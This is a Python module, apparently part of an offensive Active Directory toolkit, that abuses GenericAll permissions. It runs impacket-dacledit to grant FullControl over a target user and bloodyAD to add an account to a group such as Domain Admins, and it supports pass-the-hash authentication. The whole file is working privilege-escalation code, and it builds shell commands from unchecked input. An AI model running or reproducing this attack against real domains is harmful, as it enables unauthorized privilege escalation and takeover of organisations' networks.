# modules/genericall.py

from core.colors import red, green, blue, yellow
from core.helpers import run_command
import os

def attack_genericall(session, *parts):
    print(blue("[*] Attempting GenericAll abuse..."))

    if not parts:
        target = input("[?] Enter target (user DN or group DN): ").strip()
    else:
        target = parts[0]

    principal = parts[1] if len(parts) > 1 else session.username

    # === Case 1: target is short group name like "DEVELOPERS"
    if "," not in target:
        return _do_group_genericall(session, group=target, user_sam=principal)

    # === Case 2: Full DN provided
    if "domain admins" in target.lower() or "group" in target.lower() or "cn=developers" in target.lower():
        return _do_group_genericall(session, group=target, user_sam=principal)
    else:
        return _do_user_genericall(session, target_dn=target, principal=principal)


def _do_user_genericall(session, target_dn, principal):
    print(blue(f"[*] Target is a user. Attempting FullControl via dacledit..."))

    if session.hash:
        auth = f"{session.domain}/{session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"{session.domain}/{session.username}:{session.password}"

    cmd = (
        f'impacket-dacledit -action write -rights FullControl '
        f'-principal "{principal}" -target-dn "{target_dn}" '
        f'{auth} -dc-ip {session.dc_ip}'
    )

    print(blue(f"[*] Running: {cmd}"))
    out, err = run_command(cmd)
    combined = out + "\n" + err
    lower = combined.lower()

    if any(x in lower for x in ["success", "fullcontrol", "modified", "added"]):
        print(green("[+] GenericAll abuse likely succeeded."))
        print(green(out.strip()))
        return

    if "principal sid not found" in lower or "target principal not found" in lower:
        print(red("[-] Principal SID not found — try using full DN for principal."))
        prompt = input("[?] Enter full DN for principal (e.g. CN=sam,CN=Users,...): ").strip()
        if prompt:
            return _do_user_genericall(session, target_dn, prompt)
    elif "no such object" in lower:
        print(red("[-] Target DN not found."))
    elif "access denied" in lower:
        print(red("[-] Access denied."))
    else:
        print(yellow("[!] Unknown output. Full response:"))
        print(combined.strip())


def _do_group_genericall(session, group, user_sam=None):
    print(blue(f"[*] Target is a group. Attempting to add user to group via BloodyAD..."))

    if not user_sam:
        user_sam = session.username

    if session.hash:
        auth = f"-u \"{session.username}\" -p :{session.hash}"
        cmd = f"bloodyAD --host {session.target_ip} -d {session.domain} {auth} add groupMember \"{group}\" \"{user_sam}\""
    elif session.password:
        auth = f"-u \"{session.username}\" -p \"{session.password}\""
        cmd = f"bloodyAD --host {session.target_ip} -d {session.domain} {auth} add groupMember \"{group}\" \"{user_sam}\""


    print(blue(f"[*] Running: {cmd}"))
    out, err = run_command(cmd)
    combined = out + "\n" + err

    if "success" in combined.lower() or "added" in combined.lower():
        print(green(f"[+] User '{user_sam}' successfully added to group '{group}'!"))
    elif "access denied" in combined.lower():
        print(red("[!] Access denied. You may not have GenericAll rights on this group."))
    else:
        print(yellow("[!] Unclear output. Here is the full response:"))
        print(combined.strip())
